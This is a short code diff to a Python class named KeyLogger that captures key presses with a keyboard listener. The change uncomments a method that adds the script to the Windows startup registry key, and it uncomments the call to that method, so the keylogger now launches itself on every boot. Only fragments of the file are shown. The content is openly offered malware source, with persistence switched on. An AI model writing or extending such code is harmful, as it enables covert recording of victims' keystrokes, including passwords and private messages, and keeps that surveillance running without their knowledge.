@@ -33,7 +33,7 @@ class KeyLogger:
         with Listener(on_press=self.log_key) as listener:
             listener.join()
 
-    """def add_to_startup(self):
+    def add_to_startup(self):
         # Path to the Python script
         script_path = os.path.abspath(sys.argv[0])
         
@@ -48,12 +48,12 @@ class KeyLogger:
             reg.CloseKey(registry)
             print("Keylogger added to startup.")
         except Exception as e:
-            print(f"Failed to add keylogger to startup: {e}") """
+            print(f"Failed to add keylogger to startup: {e}") 
 
 # Main execution
 if __name__ == "__main__":
     keylogger = KeyLogger()
 
-    """keylogger.add_to_startup()"""
+    keylogger.add_to_startup()
 
     keylogger.start()
